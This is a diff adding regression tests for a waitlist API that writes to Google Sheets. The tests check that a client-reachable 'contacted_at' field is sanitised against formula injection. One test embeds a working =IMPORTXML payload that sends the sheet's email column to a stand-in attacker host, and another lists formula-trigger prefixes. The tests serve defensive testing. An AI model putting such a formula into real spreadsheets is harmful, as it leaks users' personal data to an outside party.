@@ -249,4 +249,33 @@ describe('updateWaitlistStatus — six new D-17 fields (behavioural, fake Sheets
     expect(setup.sheet._calls.setValue.length).toBe(1);
     expect(setup.sheet._calls.setValue[0]).toEqual({ row: 2, col: colIndex('contacted_at'), value: iso });
   });
+
+  // CR-02 regression. contacted_at was the only one of the six new columns written
+  // without waitlistCellSafe(). update_waitlist_status is on ADMIN_PROXY_ACTIONS and
+  // the proxy forwards the client's whole body, so this field IS client-reachable —
+  // "only the server sets it" was not true. An unsanitized =IMPORTXML(...) would be
+  // evaluated by Sheets on the shared production spreadsheet and could exfiltrate the
+  // whole email column.
+  test('contacted_at routes through waitlistCellSafe — a formula payload is neutralized', function () {
+    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
+    var payload = '=IMPORTXML("https://attacker.example/?d="&ENCODEURL(JOIN(",",B2:B999)),"//x")';
+    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', contacted_at: payload });
+
+    expect(result.ok).toBe(true);
+    expect(setup.sheet._calls.setValue.length).toBe(1);
+    var written = setup.sheet._calls.setValue[0];
+    expect(written.col).toBe(colIndex('contacted_at'));
+    // Leading apostrophe forces Sheets to treat the cell as literal text, never a formula.
+    expect(String(written.value).charAt(0)).toBe("'");
+  });
+
+  test.each([
+    ['+1'], ['-1'], ['@import']
+  ])('contacted_at: %p is prefixed rather than written raw', function (badValue) {
+    var setup = makeWaitlistApiWithRow({ id: 'wl-0001', status: 'waiting' });
+    var result = setup.api.updateWaitlistStatus({ id: 'wl-0001', contacted_at: badValue });
+
+    expect(result.ok).toBe(true);
+    expect(String(setup.sheet._calls.setValue[0].value).charAt(0)).toBe("'");
+  });
 });
